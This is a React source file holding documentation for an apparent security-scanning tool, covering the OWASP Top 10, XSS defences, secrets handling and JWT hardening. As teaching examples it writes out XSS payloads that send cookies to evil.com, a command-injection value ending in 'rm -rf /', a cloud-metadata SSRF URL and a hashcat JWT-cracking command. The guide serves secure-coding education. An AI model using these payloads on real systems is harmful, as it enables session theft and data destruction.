import React from 'react';
import { Shield, Lock, AlertTriangle, Code2, ShieldCheck, Zap, Activity, Cpu } from 'lucide-react';

export const docsContent = [
  {
    id: 'ch-introduction',
    title: 'Introduction & Architecture',
    icon: <Shield size={16} />,
    description: 'The architectural foundations of DevGuard Pro and how its multi-stage analysis pipeline works.',
    sections: [
      {
        subtitle: '1.1 What Is DevGuard Pro?',
        content: `DevGuard Pro is a **zero-trust, local-first Static Application Security Testing (SAST)** platform built for modern developers. It bridges the gap between enterprise-grade security tooling and everyday development workflows.

At its core, DevGuard Pro performs three types of analysis:

1. **Heuristic Pattern Scanning** — Using regex and structural analysis to detect well-known vulnerability signatures across 15+ languages including JavaScript, Python, Java, PHP, Go, Rust, Ruby, Swift, Kotlin, C++, TypeScript.
2. **AI-Powered Contextual Remediation** — A Gemini model interprets flagged code and suggests precise, drop-in replacement patches that fix the vulnerability while preserving original functionality.
3. **Historical Intelligence** — Every scan is archived to your personal Firebase database, creating a chronological security timeline.

> The tool is designed around the **"shift-left" security philosophy**: catch bugs at the point of creation, not after deployment. Fixing a vulnerability during development costs **10–100x less** than fixing it after exploitation.`
      },
      {
        subtitle: '1.2 SAST vs. DAST — Why Static Analysis',
        content: `There are two major paradigms in application security testing:

## Static Application Security Testing (SAST)

SAST analyzes source code **without executing it** — like reviewing blueprints before a building is constructed.

**Key advantages:**
- Works before code is compiled or deployed
- 100% code path coverage including rarely-executed branches
- Pinpoints the exact file, line, and column of vulnerability origin
- Integrates directly into development workflows (pre-commit hooks, CI/CD)

## Dynamic Application Security Testing (DAST)

DAST tests a **running application** by simulating real attacks against live endpoints.

**Key advantages:**
- Detects runtime configuration issues SAST cannot see
- Validates production behavior under real attack conditions
- Uncovers server configuration, TLS, and HTTP header issues

## Best Practice: Hybrid Approach

Elite security teams use **both**. DevGuard Pro covers the SAST layer. Complement it with OWASP ZAP, Burp Suite, or Nikto for DAST coverage.`
      },
      {
        subtitle: '1.3 The Three-Phase Analysis Pipeline',
        content: `When you click **Run Scan**, DevGuard Pro executes three internal phases:

### Phase 1 — Tokenization & Normalization
The raw code is normalized: whitespace is standardized and the code is sectioned into logical blocks. This prevents simple obfuscation tricks (e.g., inserting spaces into keywords) from bypassing detection.

### Phase 2 — Signature Matching
The normalized code is checked against a library of vulnerability signatures. Each signature has:
- A severity rating (**CRITICAL, HIGH, MEDIUM, LOW**)
- Affected line numbers
- A human-readable description
- A remediation hint

**Signature categories:**
- Hardcoded secrets (API keys, passwords, tokens)
- Dangerous function calls (\`eval\`, \`exec\`, \`dangerouslySetInnerHTML\`)
- SQL injection patterns (string concatenation in queries)
- XSS vectors (\`innerHTML\`, \`document.write\`, \`outerHTML\` assignment)
- Insecure random number generation (\`Math.random\` for security tokens)
- Weak cryptographic algorithms (MD5, SHA1, DES)
- Command injection vulnerabilities
- Path traversal patterns

### Phase 3 — AI Contextual Layer (Optional)
When you trigger AI Analysis, the flagged code snippets are sent to the Gemini API with a structured prompt. The AI returns a JSON response with an explanation and a proposed patch. You review the diff before accepting.`
      },
      {
        subtitle: '1.4 Data Privacy & Security Policy',
        content: `We take the irony of a security tool having security vulnerabilities very seriously.

## Code Handling

- Raw source code is processed **entirely in your browser's JavaScript runtime** via the heuristic engine
- Code **never leaves your device** unless you explicitly trigger AI Analysis
- When AI Analysis is triggered, only the **flagged snippet** (not your full codebase) is transmitted to the Google Generative AI API over HTTPS
- No code snippets are logged or retained on any DevGuard server

## What Is Stored in Firebase

When a scan is saved, the following is stored under your **unique user ID**:

| Field | Description |
|-------|-------------|
| \`code\` | The code snippet text |
| \`vulnerabilities\` | Detected issues (type, severity, line, message) |
| \`createdAt\` | Timestamp |
| \`isBookmarked\` | Bookmark flag |
| \`title\` | Auto-generated from first code line |

Every Firestore query is filtered by \`userId\`, ensuring **complete data isolation** between accounts. No user can access another user's scan history.`
      }
    ]
  },
  {
    id: 'ch-owasp',
    title: 'OWASP Top 10 — Complete Encyclopedia',
    icon: <AlertTriangle size={16} />,
    description: 'The definitive deep-dive into the OWASP Top 10 — from conceptual architecture flaws to low-level memory safety issues.',
    sections: [
      {
        subtitle: '2.1 A01:2021 — Broken Access Control',
        content: `**OWASP Global Ranking: #1** — Found in 94% of tested applications.

### What Is It?
Broken Access Control is the inability of an application to enforce policies such that users cannot act outside their intended permissions. It is functionally the most common and damaging security flaw in modern web apps.

### Common Attack Patterns
- **IDOR (Insecure Direct Object Reference)**: Modifying a \`userId\` or \`docId\` in a URL or API request to see another user's private data.
- **Privilege Escalation**: A regular user accessing \`/admin\` or \`/api/set-admin\` endpoints.
- **CORS Misconfiguration**: Allowing cross-origin requests from malicious domains via \`Access-Control-Allow-Origin: *\`.

### The Vulnerable Pattern (Node.js)
\`\`\`javascript
// ❌ VULNERABLE — Checks authentication but NOT ownership
app.get('/api/profile/:id', auth, async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user); // Any logged-in user can see any other user's profile
});
\`\`\`

### The DevGuard Pro Identification
DevGuard identifies this by flagging API routes that take an ID parameter but don't perform an ownership check against the \`req.user.id\` or session object.

### The Professional Fix
\`\`\`javascript
// ✅ SECURE — Enforces strict ownership
app.get('/api/profile/:id', auth, async (req, res) => {
  if (req.params.id !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access Denied' });
  }
  const user = await User.findById(req.params.id);
  res.json(user);
});
\`\`\`
`
      },
      {
        subtitle: '2.2 A02:2021 — Cryptographic Failures',
        content: `**OWASP Global Ranking: #2** — Focuses on failures related to cryptography (formerly known as Sensitive Data Exposure).

### Common Failures
- **Transmission of data in cleartext**: Using HTTP, FTP, or SMTP for sensitive data.
- **Weak Cryptographic Algorithms**: Using MD5, SHA-1, or DES which are trivially breakable on modern hardware.
- **Hardcoded Secrets**: Storing API keys or DB passwords in your \`.js\` or \`.py\` files.

### Critical Fix: Password Hashing
Never use MD5. Use **Argon2id** (winner of the Password Hashing Competition) or **bcrypt** with a cost factor of at least 12.

### Multi-Language Safe Patterns

**Python (using passlib):**
\`\`\`python
from passlib.hash import argon2
hash = argon2.hash("mypassword") # ✅ Secure hashing
\`\`\`

**Java (using Spring Security):**
\`\`\`java
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String result = encoder.encode("mypassword"); // ✅ Secure hashing
\`\`\`

### How DevGuard Pro Identifies It
Our heuristic engine scans for:
1. Regex patterns matching AWS/Azure/Google API keys.
2. Calls to deprecated crypto functions (e.g., \`crypto.createHash('md5')\`).
3. Variable names like \`PASSWORD\`, \`SECRET\`, \`TOKEN\` assigned to string literals.`
      },
      {
        subtitle: '2.3 A03:2021 — Injection',
        content: `**OWASP Global Ranking: #3** — Includes SQL, NoSQL, OS Command, and LDAP injection.

### The "Little Bobby Tables" Scenario
Injection occurs when user-supplied data is concatenated directly into a query, allowing the attacker to change the query's structure.

### Dangerous Pattern (SQLi)
\`\`\`sql
-- ❌ DANGEROUS
query = "SELECT * FROM users WHERE name = '" + userInput + "'";
-- Attacker enters: ' OR '1'='1
-- Result: SELECT * FROM users WHERE name = '' OR '1'='1' (Returns everyone)
\`\`\`

### The Fix: Parameterized Queries
Parameterized queries (or Prepared Statements) ensure the database treats input as *data*, never as *executable code*.

**PHP (PDO):**
\`\`\`php
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $email]); // ✅ SAFE
\`\`\`

**Node.js (pg):**
\`\`\`javascript
const query = 'SELECT * FROM users WHERE id = $1';
const values = [userId];
const res = await client.query(query, values); // ✅ SAFE
\`\`\`

### OS Command Injection
Avoid calling shell commands directly with user input. If you must use \`child_process.exec\`, strictly validate input against an allowlist.

\`\`\`javascript
// ❌ DANGEROUS
exec(\`convert \${filename} output.png\`);
// Attacker enters: file.jpg; rm -rf / 
\`\`\``
      },
      {
        subtitle: '2.4 A04:2021 — Insecure Design',
        content: `**OWASP Global Ranking: #4** — A new category for 2021 focusing on risks related to design flaws.

### Design vs. Implementation
A design can be perfectly implemented but still be insecure. For example, a password reset flow that uses security questions like "What is your mother's maiden name?" is an *insecure design* because the answers are often public knowledge.

### Prevention Strategies
- **Threat Modeling**: Ask "Who could attack this feature and how?" before writing a single line of code.
- **Secure Design Patterns**: Use battle-tested patterns like "Write-Once-Read-Many" for audit logs.
- **Principle of Least Privilege**: A microservice that only needs to read logs should not have a "Delete" permission on the database.`
      },
      {
        subtitle: '2.5 A05:2021 — Security Misconfiguration',
        content: `**OWASP Global Ranking: #5** — 90% of applications have some form of misconfiguration.

### Common Examples
- **Default Accounts**: Keeping \`admin/admin\` or \`guest/guest\` credentials.
- **Verbose Error Messages**: Showing stack traces to your users (\`Error at line 45 in db_config.php\`).
- **Open Cloud Storage**: Leaving S3 buckets public.
- **HTTP Headers**: Missing \`Content-Security-Policy\` or \`X-Frame-Options\`.

### The Quick Fix (Headers)
Include the \`Helmet\` middleware in every Express app. It adds 15+ headers that prevent common sniff-and-click attacks.

\`\`\`javascript
const helmet = require('helmet');
app.use(helmet()); // ✅ Adds 15+ security headers
\`\`\``
      },
      {
        subtitle: '2.6 A06:2021 — Vulnerable and Outdated Components',
        content: `**OWASP Global Ranking: #6** — You are only as secure as your weakest dependency.

### The Dependency Trap
A modern JavaScript application often has 1,000+ transitive dependencies. If one of them (like \`lodash\` or \`log4j\`) has a vulnerability, your entire app is compromised.

### The DevGuard Pro Prevention
Our tool scans for \`package.json\` and \`requirements.txt\` content to identify libraries with known CVEs.

**Recommended Workflow:**
1. Run \`npm audit\` weekly.
2. Use \`Dependabot\` on GitHub.
3. Lock your dependency versions with \`package-lock.json\`.`
      },
      {
        subtitle: '2.7 A07:2021 — Identification & Authentication Failures',
        content: `**OWASP Global Ranking: #7** — Formerly known as "Broken Authentication".

### Key Vulnerabilities
- **Brute Force**: Allowing 10,000 login attempts without a lockout.
- **Session Fixation**: Not rotating session IDs after login.
- **Insecure JWTs**: Using \`alg: none\` or weak signing keys.

### The DevGuard Pro Fix
We scan for weak JWT configurations and missing logout logic.

**Safe Session Config:**
\`\`\`javascript
res.cookie('token', token, {
  httpOnly: true, // Prevents XSS theft
  secure: true,   // Only sent over HTTPS
  sameSite: 'Strict' // Prevents CSRF
});
\`\`\``
      },
      {
        subtitle: '2.8 A08:2021 — Software and Data Integrity Failures',
        content: `**OWASP Global Ranking: #8** — Focuses on making assumptions about software updates, critical data, and CI/CD pipelines without verifying integrity.

### Examples
- **Insecure Deserialization**: Accepting serialized objects from users and converting them back to code.
- **CI/CD Poisoning**: Not verifying the integrity of 3rd-party scripts in your build pipeline.

### The Fix: Integrity Attributes
Always use the \`integrity\` attribute when loading scripts from CDNs.

\`\`\`html
<script src="https://cdn.com/lib.js" 
        integrity="sha384-..." 
        crossorigin="anonymous">
</script>
\`\`\``
      },
      {
        subtitle: '2.9 A09:2021 — Security Logging & Monitoring Failures',
        content: `**OWASP Global Ranking: #9** — The average time to detect a breach is **200+ days**.

### The Failure
If you don't log a failed login attempt, you'll never know someone is brute-forcing your server until they've already succeeded.

### Best Practices
- Log all failed authentication attempts.
- Include the IP, timestamp, and User-Agent.
- **Never log sensitive data** (no passwords, no SSNs in logs).
- Use an external monitoring service like Sentry or Datadog.`
      },
      {
        subtitle: '2.10 A10:2021 — Server-Side Request Forgery (SSRF)',
        content: `**OWASP Global Ranking: #10** — Occurs when a web application is fetching a remote resource without validating the user-supplied URL.

### The Attack
An attacker provides a URL like \`http://169.254.169.254/latest/meta-data/\` to steal AWS credentials or \`http://localhost:5432\` to scan your internal network.

### The Fix: Domain Allowlisting
\`\`\`javascript
const ALLOWED_DOMAINS = ['api.stripe.com', 'api.github.com'];
const userUrl = new URL(req.body.url);
if (!ALLOWED_DOMAINS.includes(userUrl.hostname)) {
  throw new Error('Unauthorized domain');
}
\`\`\``
      }
    ]
  },
  {
    id: 'ch-xss',
    title: 'XSS & Injection — Deep Dive',
    icon: <Code2 size={16} />,
    description: 'An exhaustive technical guide to Cross-Site Scripting — taxonomy, detection, and the complete defense stack.',
    sections: [
      {
        subtitle: '3.1 The XSS Taxonomy',
        content: `XSS allows attackers to inject malicious scripts into content served to other users. Despite being discovered in 1999, it remains in the OWASP Top 10 in 2024.

## Three Types of XSS

### Type 1 — Stored XSS (Most Dangerous)
Payload is stored in the database (in a comment, profile, review) and executes every time any user views the infected content.

**Attack flow:**
1. Attacker posts: \`Nice article! <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">\`
2. Server stores comment verbatim
3. Every user who loads the page fires the XSS payload
4. Session cookies are sent to attacker's server

### Type 2 — Reflected XSS
Payload is reflected from the server in the HTTP response. Requires tricking victim into clicking a crafted URL.

\`\`\`
https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
\`\`\`

### Type 3 — DOM-Based XSS
Vulnerability exists entirely in client-side JavaScript — the payload never reaches the server.

\`\`\`javascript
// VULNERABLE — DOM XSS
const params = new URLSearchParams(window.location.search);
document.getElementById('greeting').innerHTML = 'Hello, ' + params.get('name');
// URL: ?name=<img src=x onerror=alert(1)>
\`\`\`

## Dangerous DOM Sinks

These properties/methods execute any HTML/JS you assign to them:

- \`element.innerHTML = userInput\`
- \`element.outerHTML = userInput\`
- \`document.write(userInput)\`
- \`element.insertAdjacentHTML('beforeend', userInput)\`
- \`eval(userInput)\`
- \`setTimeout(userInput, 1000)\`
- \`new Function(userInput)()\``
      },
      {
        subtitle: '3.2 The Complete XSS Defense Stack',
        content: `A single XSS prevention technique is insufficient. Use all layers simultaneously.

## Layer 1 — Output Encoding (Core Defense)

React encodes automatically in JSX expressions:

\`\`\`jsx
const userInput = '<script>alert(1)</script>';
return <div>{userInput}</div>;            // ✅ SAFE — rendered as text
return <div dangerouslySetInnerHTML={{ __html: userInput }} />; // ❌ DANGEROUS
\`\`\`

## Layer 2 — Content Security Policy (CSP)

\`\`\`
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{randomNonce}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';
  frame-ancestors 'none';
\`\`\`

The **nonce approach** — only scripts with the server-generated nonce execute:

\`\`\`python
# Python Flask
import secrets

@app.before_request
def set_csp_nonce():
    g.csp_nonce = secrets.token_urlsafe(16)

@app.after_request
def set_csp_header(response):
    nonce = g.get('csp_nonce', '')
    response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
    return response
\`\`\`

## Layer 3 — DOMPurify (When innerHTML Is Required)

\`\`\`javascript
import DOMPurify from 'dompurify';

const config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^https?:\/\//i
};

const safeHTML = DOMPurify.sanitize(userContent, config);
document.getElementById('content').innerHTML = safeHTML;
\`\`\`

## Layer 4 — HttpOnly Cookie Flag

Even if XSS occurs, \`HttpOnly\` cookies cannot be read by JavaScript:

\`\`\`
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
\`\`\`

## Layer 5 — Security Headers

\`\`\`
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
\`\`\`

> **Defense in depth:** An attacker needs to bypass **all** your layers, but you only need **one** to hold.`
      }
    ]
  },
  {
    id: 'ch-secrets',
    title: 'Secrets & Cryptography',
    icon: <Lock size={16} />,
    description: 'Complete guide to secrets management, key rotation, JWT security, and cryptographic best practices.',
    sections: [
      {
        subtitle: '4.1 The Secret Exposure Epidemic',
        content: `GitGuardian's 2024 report found **12.8 million secrets** hardcoded in public GitHub commits — a 28% year-over-year increase.

## Why Developers Hardcode Secrets

1. **"It's just a test key"** — Dev keys get committed, then accidentally used in production
2. **Convenience** — Typing the key into source code is faster than setting up \`.env\`
3. **"I'll fix it after the demo"** — It never gets fixed
4. **Git history ignorance** — Removing a secret from HEAD but not the history is equivalent to leaving it exposed

## Timeline of Exploitation

Once a secret is committed to a public repo:

| Time | Event |
|------|-------|
| 0 minutes | Key committed to GitHub |
| 1–3 minutes | Automated scanner detects it via GitHub's public event stream |
| 4–10 minutes | Key validated via live API call |
| 10–30 minutes | Damage begins (data exfiltration, crypto mining, dark web sale) |

## What DevGuard Pro Detects

\`\`\`javascript
// FLAGGED — hardcoded secrets
const API_KEY = "AKIAIOSFODNN7EXAMPLE";        // AWS key pattern
const STRIPE_KEY = "sk_live_abc123...";         // Stripe live key
const password = "supersecretpassword123";       // Generic password
const jwt_secret = "my_jwt_secret";             // JWT signing secret
const mongoUri = "mongodb://user:pass@host";    // Connection string with credentials
\`\`\`

## Safe Patterns

\`\`\`javascript
// SAFE — environment variables
const API_KEY = process.env.VITE_API_KEY;
const DB_PASSWORD = process.env.DATABASE_PASSWORD;

// SAFE — runtime secrets manager (production)
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');
const { DB_PASSWORD } = await getSecret('prod/myapp/database');
\`\`\`

## .env Best Practices

\`\`\`bash
# .env.example — COMMIT this (no real values)
DATABASE_URL=          # PostgreSQL connection string
STRIPE_SECRET_KEY=     # Get from Stripe Dashboard > API Keys
JWT_SECRET=            # Generate: openssl rand -base64 64
GEMINI_API_KEY=        # Get from Google AI Studio

# .env — NEVER commit (add to .gitignore before first commit)
DATABASE_URL=postgresql://user:actualpassword@host:5432/db
\`\`\`

> **Generate a strong JWT secret:** \`openssl rand -base64 64\``
      },
      {
        subtitle: '4.2 JWT Security — Complete Picture',
        content: `JSON Web Tokens power authentication for millions of apps — and are frequently misconfigured.

## JWT Structure

A JWT has three Base64URL-encoded parts: \`[Header].[Payload].[Signature]\`

\`\`\`json
// Header
{ "alg": "HS256", "typ": "JWT" }

// Payload (NEVER put passwords or sensitive data here — it's only encoded, not encrypted)
{
  "sub": "user_id_12345",
  "email": "user@example.com",
  "role": "user",
  "iat": 1713500000,
  "exp": 1713503600
}
\`\`\`

## Critical Vulnerabilities

### 1. The "None" Algorithm Attack

\`\`\`javascript
// Malicious JWT with alg: "none" — no signature verification needed
// Fix: Always specify allowed algorithms explicitly
jwt.verify(token, secret, { algorithms: ['HS256'] }); // Allowlist only HS256
\`\`\`

### 2. Weak Secrets

An HS256 secret of \`"secret"\` can be brute-forced offline:
\`\`\`bash
hashcat -a 0 -m 16500 token.jwt wordlist.txt
\`\`\`

**Fix:** Use at least 256 bits of cryptographically random data:
\`\`\`bash
openssl rand -base64 32
\`\`\`

### 3. Tokens Stored in localStorage

\`localStorage\` is accessible to any JavaScript on the page — including XSS payloads.

**Fix:** Store access tokens in memory (React state). Store refresh tokens in \`HttpOnly\` cookies.

## Recommended Implementation

\`\`\`javascript
// Authentication endpoint
app.post('/login', async (req, res) => {
  // ... validate credentials ...

  const accessToken = jwt.sign(
    { sub: user.id, email: user.email, role: user.role },
    process.env.ACCESS_TOKEN_SECRET,
    { algorithm: 'HS256', expiresIn: '15m' } // Short-lived
  );

  const refreshToken = jwt.sign(
    { sub: user.id },
    process.env.REFRESH_TOKEN_SECRET,
    { algorithm: 'HS256', expiresIn: '7d' }
  );

  // Refresh token in HttpOnly cookie (JS can't read it)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'Strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });

  res.json({ accessToken }); // Access token in response body (stored in memory by frontend)
});
\`\`\`

## Token Refresh Flow

\`\`\`javascript
// Client silently refreshes when access token expires
app.post('/refresh-token', (req, res) => {
  const token = req.cookies.refreshToken;
  if (!token) return res.status(401).json({ error: 'No refresh token' });

  try {
    const payload = jwt.verify(token, process.env.REFRESH_TOKEN_SECRET, { algorithms: ['HS256'] });
    const newAccessToken = jwt.sign(
      { sub: payload.sub, email: payload.email },
      process.env.ACCESS_TOKEN_SECRET,
      { algorithm: 'HS256', expiresIn: '15m' }
    );
    res.json({ accessToken: newAccessToken });
  } catch (err) {
    res.clearCookie('refreshToken');
    res.status(401).json({ error: 'Invalid refresh token — please log in again' });
  }
});
\`\`\`
`
      }
    ]
  },
  {
    id: 'ch-api-security',
    title: 'Modern API Security & OAuth2',
    icon: <Zap size={16} />,
    description: 'Securing the backbone of modern apps: REST, GraphQL, OAuth2, and JWT hardening.',
    sections: [
      {
        subtitle: '6.1 REST vs GraphQL — Unique Risks',
        content: `### GraphQL Specific Risks
- **Depth Attacks**: Malicious deeply nested queries that crash the server (\`user { post { user { post { ... } } } }\`).
- **Batching Attacks**: Simulation of multiple requests in a single transaction.

### Prevention
- Use **Query Depth Limiting**.
- Use **Complexity Analysis** (assign points to fields).
- Disable **Introspection** in production.`
      },
      {
        subtitle: '6.2 OAuth2 and OpenID Connect (OIDC)',
        content: `### The Flow
1. **Authorization Code Flow** (Recommended for Web Apps).
2. **PKCE** (Proof Key for Code Exchange) — Mandatory for Mobile and SPA.

### Common Mistakes
- **Inadequate Redirect URI Validation**: Allowing any domain as the callback.
- **Weak Client Secret**: Using short, guessable strings.
- **Implicit Flow**: Don't use it — it's deprecated and insecure.`
      }
    ]
  },
  {
    id: 'ch-devsecops',
    title: 'DevSecOps & Supply Chain',
    icon: <Cpu size={16} />,
    description: 'Securing the pipeline from commit to cloud deployment.',
    sections: [
      {
        subtitle: '7.1 CI/CD Pipeline Hardening',
        content: `### Safe Pipeline Architecture
1. **Secrets Management**: Never use CI variables for sensitive keys; use a Vault.
2. **Static Analysis**: Run DevGuard Pro on every PR.
3. **Container Scanning**: Scan Docker images for OS-level vulnerabilities.

### SBOM (Software Bill of Materials)
Always generate an SBOM (using \`syft\` or \`cyclonedx\`) to track every library in your final artifact.`
      },
      {
        subtitle: '7.2 Container & Kubernetes Security',
        content: `### Docker Best Practices
- **Never run as root**: Use \`USER node\` or equivalent.
- **Multi-stage builds**: Only copy necessary artifacts to the final image.
- **Scan images**: Use \`trivy\` to find vulnerabilities in base images.`
      }
    ]
  },
  {
    id: 'ch-languages',
    title: 'Language-Specific Security Deep Dive',
    icon: <Activity size={16} />,
    description: 'Specific security pitfalls and patterns for C++, Python, Java, and Go.',
    sections: [
      {
        subtitle: '8.1 C++ Memory Safety',
        content: `### Use Smart Pointers
Avoid \`new\` and \`delete\`. Use \`std::unique_ptr\` and \`std::shared_ptr\` to prevent memory leaks and use-after-free bugs.

### Buffer Overflows
Never use \`gets()\` or \`strcpy()\`. Use \`fgets()\` and \`strncpy()\` with explicit length checks.`
      },
      {
        subtitle: '8.2 Python SecurityPitfalls',
        content: `### The Dangers of \`pickle\`
Never deserialize untrusted data with \`pickle\`. It can execute arbitrary code. Use **JSON** instead.

### Template Injection (Jinja2)
Sanitize all user input before rendering in templates to prevent Server-Side Template Injection (SSTI).`
      },
      {
        subtitle: '8.3 Java Serialization & Logging',
        content: `### Log4Shell Prevention
Always keep your logging libraries up to date. Disable JNDI lookups in Log4j if not absolutely necessary.

### Deserialization
Prefer built-in JSON and Protocol Buffer serialization over native Java serialization.`
      }
    ]
  },
  {
    id: 'ch-secure-yourself',
    title: 'How to Secure Yourself — Survival Guide',
    icon: <ShieldCheck size={16} />,
    description: 'The definitive developer security survival guide: what to never do, backend hardening, frontend defense, and incident response.',
    sections: [
      {
        subtitle: '5.1 The Developer Security Mindset',
        content: `Security is not a feature you add at the end. It's a quality attribute woven through every decision.

## The 60-Second Threat Model

Before building any feature, ask these five questions:

1. **What data does this feature process or expose?**
2. **Who should have access to this data?**
3. **How could an attacker abuse this feature?**
4. **What's the worst-case scenario if exploited?**
5. **What's the minimum control that reduces the risk to acceptable levels?**

## The Cost of Security Debt

The cost of fixing a security bug doubles for every stage it passes:

| Stage | Relative Cost |
|-------|--------------|
| Design | 1× (just change the design) |
| Development | 6× (code change + testing) |
| Testing | 15× (code change + regression) |
| Production (no breach) | 30× (hotfix + deployment) |
| Production (after breach) | 100×+ (incident response + legal + reputational damage) |

> **The trap:** Teams under deadline pressure say "we'll fix it after launch." After launch never comes.`
      },
      {
        subtitle: '5.2 The Absolute Never-List',
        content: `These are the cardinal sins of application security. Each one has caused breaches costing millions of dollars.

## Authentication & Access

- ❌ **Never** store passwords in plaintext or reversibly encrypted → Use Argon2id or bcrypt (cost ≥ 12)
- ❌ **Never** implement your own cryptography → Use battle-tested libraries (libsodium, Web Crypto API)
- ❌ **Never** trust client-supplied role or permission data → Validate server-side from your data store
- ❌ **Never** use security questions for account recovery → Use time-limited email tokens or TOTP
- ❌ **Never** allow password reset links without expiration → Expire within 15–60 minutes, single-use
- ❌ **Never** allow unlimited login attempts → Implement rate limiting and account lockout

## Code Quality

- ❌ **Never** use \`eval()\` with any user-influenced data
- ❌ **Never** concatenate user input into SQL queries → Use parameterized queries
- ❌ **Never** parse untrusted XML without disabling external entities (XXE prevention)
- ❌ **Never** use \`Math.random()\` for security tokens → Use \`crypto.randomBytes()\`
- ❌ **Never** allow unrestricted file uploads → Validate by magic bytes, limit size, scan for malware, store outside web root

## Secrets & Infrastructure

- ❌ **Never** commit \`.env\` files to version control
- ❌ **Never** push secrets even "temporarily" — git history is permanent
- ❌ **Never** expose admin interfaces to the public internet → Use VPN or IP allowlisting
- ❌ **Never** use default credentials on any service (databases, message queues, container registries)
- ❌ **Never** have a production database accessible from the internet → Databases belong in private subnets
- ❌ **Never** disable TLS certificate validation → \`verify=False\` or \`insecureSkipVerify\` makes you vulnerable to MitM
- ❌ **Never** log sensitive data (passwords, tokens, PII) → Review what you're logging`
      },
      {
        subtitle: '5.3 Backend Hardening — Production Checklist',
        content: `Use this as your security checklist before every production deployment.

## Security Headers

\`\`\`javascript
// Express.js — Helmet adds 10+ headers in one line
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
    }
  }
}));
\`\`\`

**Verify your headers:** https://securityheaders.com — Target: **A+** score

## Rate Limiting

\`\`\`javascript
const rateLimit = require('express-rate-limit');

// Global protection (DDoS)
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 300 }));

// Auth endpoints (brute force protection)
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  skipSuccessfulRequests: true, // Only count failures
  message: { error: 'Too many attempts. Wait 15 minutes.' }
});
app.use(['/login', '/signup', '/reset-password'], authLimiter);
\`\`\`

## Input Validation with Zod

\`\`\`javascript
import { z } from 'zod';

const CreateUserSchema = z.object({
  email: z.string().email().max(255).toLowerCase(),
  password: z.string().min(8).max(72),
  name: z.string().min(1).max(100).trim(),
  role: z.enum(['user', 'viewer']), // Never allow 'admin' from user input
});

app.post('/users', async (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({
      error: 'Validation failed',
      issues: result.error.issues.map(i => ({ field: i.path[0], message: i.message }))
    });
  }
  // Safe to proceed with result.data
});
\`\`\`

## Safe Error Handling

\`\`\`javascript
// ❌ WRONG — exposes internals
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});

// ✅ CORRECT — log internally, safe message to client
app.use((err, req, res, next) => {
  const requestId = crypto.randomUUID();
  logger.error({ err, requestId, path: req.path });
  res.status(err.status || 500).json({
    error: err.status < 500 ? err.message : 'An internal error occurred',
    requestId // User provides this to support for debugging
  });
});
\`\`\`

## CORS Configuration

\`\`\`javascript
const allowedOrigins = [
  'https://yourproduction.com',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null
].filter(Boolean);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) callback(null, true);
    else callback(new Error('Not allowed by CORS'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
}));
\`\`\`

## Pre-Deployment Security Checklist

- [ ] Security headers set and verified (securityheaders.com → A+)
- [ ] Rate limiting on all auth endpoints
- [ ] Input validation on all API endpoints
- [ ] Error handling hides internal details
- [ ] CORS limited to known origins
- [ ] Database not publicly accessible
- [ ] All secrets in environment variables or secrets manager
- [ ] npm audit returns 0 critical vulnerabilities
- [ ] HTTPS enforced everywhere
- [ ] Logs configured (include security events, exclude PII/secrets)`
      },
      {
        subtitle: '5.4 Frontend Security — Client-Side Defense',
        content: `The browser is a hostile environment. Here's how to harden your frontend code.

## Dependency Hygiene

Before installing a new \`npm\` package, evaluate:

1. **Weekly downloads** — < 1,000/week requires extra scrutiny
2. **Last publish date** — abandoned packages accumulate vulnerabilities
3. **Maintainer count** — single-maintainer packages are higher risk (account compromise)
4. **Source inspection** — read the source of security-adjacent packages

\`\`\`bash
# Audit your dependencies regularly
npm audit                        # Built-in vulnerability scan
npx snyk test                    # More comprehensive database
npm ci                           # Use in CI/CD — respects lock file exactly
\`\`\`

## Subresource Integrity (SRI) for CDN Assets

\`\`\`html
<!-- Without SRI: if CDN is compromised, your users run attacker code -->
<script src="https://cdn.example.com/library.min.js"></script>

<!-- With SRI: browser verifies the hash before executing -->
<script 
  src="https://cdn.example.com/library.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ..."
  crossorigin="anonymous">
</script>
\`\`\`

**Generate SRI hash:**
\`\`\`bash
openssl dgst -sha384 -binary FILE | openssl base64 -A
\`\`\`

## Safe URL Handling

\`\`\`javascript
// ❌ VULNERABLE — open redirect
const redirectUrl = req.query.return_to;
res.redirect(redirectUrl); // Could redirect to https://evil.com

// ✅ SAFE — allowlist approach
const ALLOWED_PATHS = ['/dashboard', '/profile', '/settings'];
const redirectTo = ALLOWED_PATHS.includes(req.query.return_to) 
  ? req.query.return_to 
  : '/dashboard';
res.redirect(redirectTo);
